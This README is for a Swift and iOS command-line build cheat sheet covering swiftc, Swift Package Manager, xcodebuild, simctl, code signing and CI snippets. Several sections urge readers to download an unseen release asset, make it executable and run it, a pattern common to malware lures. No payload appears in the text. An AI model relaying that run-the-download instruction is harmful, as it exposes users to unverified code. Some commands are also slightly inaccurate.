# Swift iOS CLI Build Cheat Sheet — Compile, Automate

[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge&logo=github&link=https://github.com/saina501/Swift-iOS-CLI-Build-Cheat-Sheet/releases)](https://github.com/saina501/Swift-iOS-CLI-Build-Cheat-Sheet/releases)

![Swift Logo](https://swift.org/assets/images/swift.svg)

Master Swift toolchain tasks from the terminal. This repo collects concise, practical commands and scripts for:
- swiftc and the Swift toolchain
- Swift Package Manager (swift build, swift run, Package.swift)
- xcodebuild for building, testing, archiving
- xcrun and simctl for simulators and low-level tools
- common CI/CD steps for iOS apps and CLI tools

Table of contents
- Features
- Quick start
  - Prerequisites
  - Download and run release
- Swift compiler (swiftc) examples
- Swift Package Manager examples
- xcodebuild: build, test, archive, export
- xcrun + simctl: simulator control and device tasks
- Code signing and exportOptions.plist
- Building XCFrameworks and universal binaries
- Automation and CI snippets
- Helpful scripts and Makefile
- Contributing
- License

Features
- One-page cheat sheet for command-line Swift and iOS build tooling
- Focus on reproducible commands that run in CI and local shells
- Examples for building CLI tools and full iOS apps
- Commands for simulator automation and test runs
- Packaging steps for App Store, TestFlight, and ad-hoc distribution

Quick start

Prerequisites
- macOS with Xcode and Xcode Command Line Tools
- swift toolchain (system or custom)
- Access to code signing credentials (for device builds and archives)

Download and execute
- Visit the Releases page and download the provided script or archive. Download and run the release file you need:
  - https://github.com/saina501/Swift-iOS-CLI-Build-Cheat-Sheet/releases
- After download, make the file executable and run:
  - chmod +x ./release-script.sh
  - ./release-script.sh

The releases page contains packaged examples and helper scripts. The steps above assume the release includes an executable script. If your environment restricts execution, inspect the release asset before running.

Swift compiler (swiftc) examples
- Compile a single Swift file to an executable:
  - swiftc -o hello Hello.swift
- Compile with debug symbols and optimization off:
  - swiftc -g -O0 -o hello-debug Hello.swift
- Compile to object file, then link (useful for custom link steps):
  - swiftc -c -o Hello.o Hello.swift
  - clang -o Hello Hello.o -lobjc -framework Foundation
- Cross-compile using toolchain directory (custom toolchain):
  - /Library/Developer/Toolchains/swift-DEVELOPMENT.xctoolchain/usr/bin/swiftc -o prog main.swift

Swift Package Manager examples
- Create a library or executable package:
  - swift package init --type executable
- Build a package:
  - swift build --configuration release
- Run the package locally:
  - swift run
- Run tests:
  - swift test
- Generate an Xcode project from Package.swift:
  - swift package generate-xcodeproj
- Build a package for a specific architecture or destination:
  - swift build --destination .build/destinations/iphoneos.json
  - Example destination JSON points to SDK root and tools version.

xcodebuild: build, test, archive, export
- Build a scheme:
  - xcodebuild -workspace MyApp.xcworkspace -scheme "MyApp" -configuration Release -sdk iphoneos build
- Build for simulator:
  - xcodebuild -workspace MyApp.xcworkspace -scheme "MyApp" -sdk iphonesimulator -destination 'platform=iOS Simulator,name=iPhone 14' build
- Run tests on a simulator:
  - xcodebuild test -workspace MyApp.xcworkspace -scheme "MyAppTests" -destination 'platform=iOS Simulator,name=iPhone 14,OS=17.0'
- Archive the app:
  - xcodebuild -workspace MyApp.xcworkspace -scheme "MyApp" -configuration Release -archivePath ./build/MyApp.xcarchive archive
- Export IPA from archive (uses exportOptionsPlist):
  - xcodebuild -exportArchive -archivePath ./build/MyApp.xcarchive -exportOptionsPlist exportOptions.plist -exportPath ./build/export
- Common flags to speed CI:
  - -quiet to reduce log noise
  - -allowProvisioningUpdates to allow Xcode to manage profiles in CI (use with care)
- Clean build folder:
  - xcodebuild -workspace MyApp.xcworkspace -scheme "MyApp" clean

xcrun + simctl: simulator and toolchain tasks
- List available simulators:
  - xcrun simctl list devices
- Boot a simulator and install an app:
  - xcrun simctl boot "iPhone 14"
  - xcrun simctl install booted ./build/export/MyApp.ipa
  - xcrun simctl launch booted com.example.MyApp
- Erase a simulator:
  - xcrun simctl erase all
- Run UI tests using simctl with XCTest:
  - xcrun simctl spawn booted xctest -XCTest ... (advanced)
- Use xcrun to run tools from Xcode toolchain:
  - xcrun swiftc --version
  - xcrun lipo -create -output UniversalBinary arm64.o x86_64.o

Code signing and exportOptions.plist
- For archived exports you need an exportOptions.plist. Minimal example for App Store:
  - <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
      <key>method</key>
      <string>app-store</string>
      <key>uploadBitcode</key>
      <false/>
      <key>compileBitcode</key>
      <true/>
    </dict>
    </plist>
- For ad-hoc distribution:
  - method = ad-hoc
  - include provisioningProfileSpecifier or provisioningProfiles mapping
- Common xcodebuild flags for signing in CI:
  - -allowProvisioningUpdates
  - CODE_SIGN_STYLE="Automatic" or "Manual"
  - DEVELOPMENT_TEAM="YOUR_TEAM_ID"

Building XCFrameworks and universal binaries
- Build frameworks for device and simulator, then create XCFramework:
  - xcodebuild -scheme MyFramework -configuration Release -sdk iphoneos BUILD_DIR=build BUILD_ROOT=build clean build
  - xcodebuild -scheme MyFramework -configuration Release -sdk iphonesimulator BUILD_DIR=build BUILD_ROOT=build clean build
  - xcodebuild -create-xcframework -framework build/Release-iphoneos/MyFramework.framework -framework build/Release-iphonesimulator/MyFramework.framework -output MyFramework.xcframework
- Use lipo for thin fat binaries (legacy):
  - lipo -create -output MyLibUniversal.a arm64.a x86_64.a

Automation and CI snippets
- Minimal GitHub Actions job for building and testing:
  - name: Build and Test
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4
      - name: Set up Swift
        uses: fwal/setup-swift@v1
        with:
          swift-version: '5.9'
      - name: Build
        run: swift build --configuration release
      - name: Test
        run: swift test
- Archive and export in CI:
  - Use xcodebuild archive and xcodebuild -exportArchive with exportOptions.plist
  - Provide credentials via environment variables or secrets
- Caching on CI:
  - Cache SPM build artifacts: .build and DerivedData
  - Cache CocoaPods or Carthage artifacts where relevant

Helpful scripts and Makefile
- Example Makefile targets
  - build-cli:
      swift build -c release
  - run-cli:
      swift run
  - build-ios:
      xcodebuild -workspace MyApp.xcworkspace -scheme "MyApp" -configuration Release -sdk iphoneos build
  - archive:
      xcodebuild -workspace MyApp.xcworkspace -scheme "MyApp" -configuration Release -archivePath build/MyApp.xcarchive archive
- Example release script (release-script.sh)
  - #!/usr/bin/env bash
    set -euo pipefail
    PROJECT="MyApp"
    WORKSPACE="${PROJECT}.xcworkspace"
    SCHEME="${PROJECT}"
    ARCHIVE_PATH="./build/${PROJECT}.xcarchive"
    xcodebuild -workspace "${WORKSPACE}" -scheme "${SCHEME}" -configuration Release -archivePath "${ARCHIVE_PATH}" archive
    xcodebuild -exportArchive -archivePath "${ARCHIVE_PATH}" -exportOptionsPlist exportOptions.plist -exportPath ./build/export
  - Make the script executable and run it:
    - chmod +x release-script.sh
    - ./release-script.sh

iOS simulator testing patterns
- Run unit tests headless on CI:
  - xcodebuild test -workspace MyApp.xcworkspace -scheme "MyAppTests" -destination 'platform=iOS Simulator,name=iPhone 14' -parallel-testing-enabled YES
- Capture simulator logs:
  - xcrun simctl spawn booted log stream --style compact > simulator.log &
- Reset simulator state between runs:
  - xcrun simctl shutdown all
  - xcrun simctl erase all

Troubleshooting common errors
- Code signing failures:
  - Confirm provisioning profile and certificate match bundle ID and team.
  - Confirm exportOptions.plist matches the signing method.
- Missing simulator or OS:
  - xcode-select --install
  - xcodebuild -showsdks
- DerivedData conflicts:
  - rm -rf ~/Library/Developer/Xcode/DerivedData/*
- Build cache issues:
  - swift package clean
  - xcodebuild clean -workspace MyApp.xcworkspace -scheme "MyApp"

Repository topics
apple-platforms, automation, build-automation, build-tools, ci-cd, cli, command-line, cross-platform, development-workflow, ios-app-distribution, ios-development, ios-simulator, mobile-development, swift, swift-compiler, swift-package-manager, swift-toolchain, swiftc, xcodebuild, xcrun

Visual resources
- Swift logo: https://swift.org/assets/images/swift.svg
- Terminal art and icons: use shields and SVG badges for status and links
  - Releases badge used at top links to: https://github.com/saina501/Swift-iOS-CLI-Build-Cheat-Sheet/releases

Releases and packaged assets
- Visit the Releases page and download the release asset that fits your task. The release may include helper scripts and packaged examples. After download, mark the file executable and run it:
  - https://github.com/saina501/Swift-iOS-CLI-Build-Cheat-Sheet/releases
- If a release includes a script, run:
  - chmod +x ./path/to/release-script.sh
  - ./path/to/release-script.sh

Contributing
- Open an issue for missing commands or incorrect steps.
- Submit a pull request with small, focused changes.
- Keep examples reproducible on macOS with Xcode and common SPM setups.

License
- This repository uses the MIT License. Check the LICENSE file for details.